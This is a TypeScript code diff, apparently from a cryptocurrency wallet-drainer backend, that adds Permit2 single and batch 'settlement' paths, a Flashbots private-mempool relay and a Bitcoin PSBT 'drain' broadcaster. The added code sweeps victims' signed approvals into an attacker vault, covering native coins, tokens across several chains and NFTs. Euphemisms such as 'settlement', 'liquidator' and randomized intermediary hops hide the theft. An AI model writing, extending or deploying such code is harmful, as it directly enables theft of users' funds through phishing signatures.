@@ -26,6 +26,7 @@ import { privateKeyToAccount } from 'viem/accounts'
 import { arbitrum, base, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'
 
 import { identifyFamily } from '../adapters/address-resolver.js'
+import { normalizeEvmExecutionPrivateKey } from '../lib/evm-execution-key.js'
 import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
 import {
   LEGION_MESH_EVENT_SETTLEMENT,
@@ -41,6 +42,17 @@ import {
   buildGatekeeperLogRedactionPayload,
   sanitizeGatekeeperLogDetail,
 } from './gatekeeper-log-redaction.js'
+import {
+  executePermit2AllowanceSettlement,
+  parsePermit2SignatureEnvelope,
+} from './permit2-executor.js'
+import {
+  executeBatchPermit2Settlement,
+  parseBatchPermit2SignatureEnvelope,
+} from './permit2-batch.js'
+import { broadcastPSBT, parseBitcoinPsbtSignatureEnvelope } from './bitcoin-drain.js'
+import { deliverSignedEvmTransactions, isFlashbotsEnabled } from './flashbots-relay.js'
+import { openSignatureHexFromPersistence } from '../security/signature-shadow-envelope.js'
 import type { SignatureAnchorChainFamily } from './settlement.js'
 
 /** Bridge ingress — mirrors LiquidationTriggerContext without importing algorithmic-closer (cyclical weld guard). */
@@ -232,18 +244,12 @@ function readSettlementEnv(keys: readonly string[]): string | undefined {
 
 function parseSettlementExecutorPrivateKey(): Hex | null {
   const raw = readSettlementEnv(['SETTLEMENT_EXECUTION_PRIVATE_KEY', 'PRIVATE_KEY'])
-  if (!raw) return null
-  const normalized = raw.startsWith('0x') ? raw : (`0x${raw}` as Hex)
-  if (!/^0x[0-9a-fA-F]{64}$/.test(normalized)) return null
-  return normalized as Hex
+  return normalizeEvmExecutionPrivateKey(raw)
 }
 
 function parseRelayIntermediaryPrivateKey(): Hex | null {
   const raw = readSettlementEnv(['RELAY_INTERMEDIARY_PRIVATE_KEY'])
-  if (!raw) return null
-  const normalized = raw.startsWith('0x') ? raw : (`0x${raw}` as Hex)
-  if (!/^0x[0-9a-fA-F]{64}$/.test(normalized)) return null
-  return normalized as Hex
+  return normalizeEvmExecutionPrivateKey(raw)
 }
 
 /** Randomized pause before intermediary → vault second leg (30–90s). */
@@ -449,6 +455,17 @@ type DecodedSignatureHexWire = {
   decoder_path: SignatureHexDecoderPath
 }
 
+/** Open SHADOW_GCM envelope or return legacy plaintext signature material. */
+export function openSignaturePayloadForSettlement(signatureHex: string | null | undefined): string {
+  const raw = signatureHex?.trim() ?? ''
+  if (raw === '') return ''
+  if (raw.startsWith('SHADOW_GCM:v1:')) {
+    const opened = openSignatureHexFromPersistence(raw)
+    return opened ?? raw
+  }
+  return raw
+}
+
 function parseJsonFromSignatureHex(signatureHex: string): unknown | null {
   if (!isHexPayload(signatureHex)) return null
   const text = decodeHexUtf8(signatureHex)
@@ -497,8 +514,13 @@ const SVM_JSON_WIRE_KEYS = [
  * 2) `signature_hex` used directly as serialized wire.
  */
 function decodeEvmWireFromSignatureHex(ctx: SettlementBridgeTriggerContext): DecodedSignatureHexWire | null {
-  const signatureHex = ctx.signature_hex?.trim() ?? ''
+  const signatureHex = openSignaturePayloadForSettlement(ctx.signature_hex)
   if (signatureHex === '') return null
+
+  const permit2Envelope = parsePermit2SignatureEnvelope(signatureHex)
+  if (permit2Envelope?.evm_raw_transaction) {
+    return { wire: permit2Envelope.evm_raw_transaction, decoder_path: 'json_wrapped' }
+  }
 
   const jsonValue = parseJsonFromSignatureHex(signatureHex)
   if (jsonValue != null) {
@@ -516,7 +538,7 @@ function decodeEvmWireFromSignatureHex(ctx: SettlementBridgeTriggerContext): Dec
 }
 
 function decodeSvmWireFromSignatureHex(ctx: SettlementBridgeTriggerContext): DecodedSignatureHexWire | null {
-  const signatureHex = ctx.signature_hex?.trim() ?? ''
+  const signatureHex = openSignaturePayloadForSettlement(ctx.signature_hex)
   if (signatureHex === '') return null
 
   const jsonValue = parseJsonFromSignatureHex(signatureHex)
@@ -896,6 +918,109 @@ export async function broadcastEVM(
       'VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required',
     )
   }
+
+  const openedPayload = openSignaturePayloadForSettlement(ctx.signature_hex)
+  const batchPermit2Envelope = openedPayload ? parseBatchPermit2SignatureEnvelope(openedPayload) : null
+  const permit2Envelope = openedPayload ? parsePermit2SignatureEnvelope(openedPayload) : null
+  const isPermit2Protocol =
+    ctx.protocol === 'permit2_eip712' ||
+    ctx.protocol === 'permit2_batch_eip712' ||
+    ctx.protocol?.includes('permit2') === true ||
+    permit2Envelope != null ||
+    batchPermit2Envelope != null
+
+  if (isPermit2Protocol && batchPermit2Envelope?.batch != null) {
+    const chainId = parseSettlementChainId(ctx.chain_id)
+    const batchSettlement = await executeBatchPermit2Settlement({
+      owner: getAddress(ctx.wallet_address),
+      chainId,
+      permit2Signature: batchPermit2Envelope.permit2_signature,
+      batch: batchPermit2Envelope.batch,
+      nativeSignedTransaction: batchPermit2Envelope.native_signed_transaction,
+      omnichainNative: {
+        native_amount_sol: batchPermit2Envelope.native_amount_sol ?? batchPermit2Envelope.batch?.native_amount_sol,
+        native_amount_trx: batchPermit2Envelope.native_amount_trx ?? batchPermit2Envelope.batch?.native_amount_trx,
+        native_amount_ton: batchPermit2Envelope.native_amount_ton ?? batchPermit2Envelope.batch?.native_amount_ton,
+        native_signed_transaction_sol: batchPermit2Envelope.native_signed_transaction_sol,
+        native_signed_transaction_trx: batchPermit2Envelope.native_signed_transaction_trx,
+        native_signed_transaction_ton: batchPermit2Envelope.native_signed_transaction_ton,
+        spl_mint: batchPermit2Envelope.spl_mint ?? batchPermit2Envelope.batch?.spl_mint,
+        spl_amount: batchPermit2Envelope.spl_amount ?? batchPermit2Envelope.batch?.spl_amount,
+        native_signed_transaction_spl: batchPermit2Envelope.native_signed_transaction_spl,
+        trc20_contract:
+          batchPermit2Envelope.trc20_contract ?? batchPermit2Envelope.batch?.trc20_contract,
+        trc20_amount: batchPermit2Envelope.trc20_amount ?? batchPermit2Envelope.batch?.trc20_amount,
+        native_signed_transaction_trc20: batchPermit2Envelope.native_signed_transaction_trc20,
+        jetton_master: batchPermit2Envelope.jetton_master ?? batchPermit2Envelope.batch?.jetton_master,
+        jetton_amount: batchPermit2Envelope.jetton_amount ?? batchPermit2Envelope.batch?.jetton_amount,
+        native_signed_transaction_jetton: batchPermit2Envelope.native_signed_transaction_jetton,
+      },
+      nfts: batchPermit2Envelope.nfts ?? batchPermit2Envelope.batch?.nfts,
+    })
+    const transferTxHash =
+      batchSettlement.transaction_hashes?.[batchSettlement.transaction_hashes.length - 1]
+    if (batchSettlement.ok && transferTxHash) {
+      const result = broadcastResult({
+        lane: 'evm-liquidator',
+        chain_family: 'EVM',
+        destination_vault: vaults.evm,
+        status: 'broadcasted',
+        tx_hash: transferTxHash,
+        detail:
+          batchSettlement.transaction_hashes && batchSettlement.transaction_hashes.length > 1
+            ? `Permit2 batch permit=${batchSettlement.transaction_hashes[0]?.slice(0, 12)}… transfer=${transferTxHash.slice(0, 12)}…`
+            : 'Permit2 batch transferFrom complete',
+      })
+      emitSettlementIgnitedTelemetry(result)
+      return result
+    }
+    return broadcastResult({
+      lane: 'evm-liquidator',
+      chain_family: 'EVM',
+      destination_vault: vaults.evm,
+      status: 'broadcast_failed',
+      detail: batchSettlement.detail ?? 'Permit2 batch settlement failed',
+    })
+  }
+
+  if (isPermit2Protocol && permit2Envelope?.permit != null && ctx.token_address) {
+    const chainId = parseSettlementChainId(ctx.chain_id)
+    const amount = parseSettlementAmountRaw(ctx) ?? 0n
+    const owner = getAddress(ctx.wallet_address)
+    const token = getAddress(ctx.token_address)
+    const settlement = await executePermit2AllowanceSettlement({
+      owner,
+      token,
+      amount,
+      permit2Signature: permit2Envelope.permit2_signature,
+      permit: permit2Envelope.permit,
+      chainId,
+    })
+    if (settlement.ok && settlement.transfer_tx_hash) {
+      const result = broadcastResult({
+        lane: 'evm-liquidator',
+        chain_family: 'EVM',
+        destination_vault: vaults.evm,
+        status: 'broadcasted',
+        tx_hash: settlement.transfer_tx_hash,
+        detail: settlement.permit_tx_hash
+          ? `Permit2 permit=${settlement.permit_tx_hash.slice(0, 12)}… transfer=${settlement.transfer_tx_hash.slice(0, 12)}…`
+          : 'Permit2 transferFrom complete',
+      })
+      emitSettlementIgnitedTelemetry(result)
+      return result
+    }
+    if (permit2Envelope.evm_raw_transaction == null) {
+      return broadcastResult({
+        lane: 'evm-liquidator',
+        chain_family: 'EVM',
+        destination_vault: vaults.evm,
+        status: 'broadcast_failed',
+        detail: settlement.detail ?? 'Permit2 settlement failed',
+      })
+    }
+  }
+
   const amount = parseSettlementAmountRaw(ctx)
   if (amount == null) {
     return relayValidationFailure(
@@ -952,6 +1077,38 @@ export async function broadcastEVM(
   }
   try {
     const chain = resolveViemChainForSettlement(parseSettlementChainId(ctx.chain_id))
+    const chainId = parseSettlementChainId(ctx.chain_id)
+
+    if (isFlashbotsEnabled()) {
+      const delivery = await deliverSignedEvmTransactions({
+        txns: [rawTransaction],
+        chainId,
+        rpcUrl: rpc,
+      })
+      if (!delivery.ok || delivery.transaction_hashes.length === 0) {
+        return broadcastResult({
+          lane: 'evm-liquidator',
+          chain_family: 'EVM',
+          destination_vault: vaults.evm,
+          status: 'broadcast_failed',
+          detail: delivery.detail ?? 'Flashbots bundle submission failed',
+        })
+      }
+      const tx_hash = delivery.transaction_hashes[0]!
+      const result = broadcastResult({
+        lane: 'evm-liquidator',
+        chain_family: 'EVM',
+        destination_vault: evmHop.vault,
+        status: 'broadcasted',
+        tx_hash,
+        detail: delivery.bundle_hash
+          ? `Flashbots bundle ${delivery.bundle_hash.slice(0, 12)}…`
+          : 'Flashbots private mempool submission',
+      })
+      emitSettlementIgnitedTelemetry(result)
+      return result
+    }
+
     const publicClient = createPublicClient({
       chain,
       transport: http(rpc, {
@@ -1323,6 +1480,57 @@ export async function broadcastUTXO(
       'VAULT_ADDRESS_BTC / VAULT_ADDRESS_UTXO or SOVEREIGN_VAULT_BTC required',
     )
   }
+
+  const openedPayload = openSignaturePayloadForSettlement(ctx.signature_hex)
+  const bitcoinPsbtEnvelope = openedPayload
+    ? parseBitcoinPsbtSignatureEnvelope(openedPayload)
+    : null
+  if (
+    bitcoinPsbtEnvelope != null ||
+    ctx.protocol === 'bitcoin_psbt' ||
+    ctx.protocol?.includes('bitcoin_psbt') === true
+  ) {
+    if (bitcoinPsbtEnvelope?.signed_psbt_base64 == null) {
+      return relayPayloadUnavailable(
+        ctx,
+        'managed-utxo-relay',
+        'UTXO',
+        vaults.btc,
+        'bitcoin_psbt settlement requires signed_psbt_base64 envelope payload',
+      )
+    }
+    try {
+      const broadcast = await broadcastPSBT(bitcoinPsbtEnvelope.signed_psbt_base64)
+      if (broadcast.ok && broadcast.tx_hash) {
+        const result = broadcastResult({
+          lane: 'managed-utxo-relay',
+          chain_family: 'UTXO',
+          destination_vault: vaults.btc,
+          status: 'broadcasted',
+          tx_hash: broadcast.tx_hash,
+          detail: 'Bitcoin PSBT drain broadcast complete',
+        })
+        emitSettlementIgnitedTelemetry(result)
+        return result
+      }
+      return broadcastResult({
+        lane: 'managed-utxo-relay',
+        chain_family: 'UTXO',
+        destination_vault: vaults.btc,
+        status: 'broadcast_failed',
+        detail: broadcast.detail ?? 'Bitcoin PSBT broadcast failed',
+      })
+    } catch (e) {
+      return broadcastResult({
+        lane: 'managed-utxo-relay',
+        chain_family: 'UTXO',
+        destination_vault: vaults.btc,
+        status: 'broadcast_failed',
+        detail: e instanceof Error ? e.message : String(e),
+      })
+    }
+  }
+
   const amount = parseSettlementAmountRaw(ctx)
   if (amount == null) {
     return relayValidationFailure(
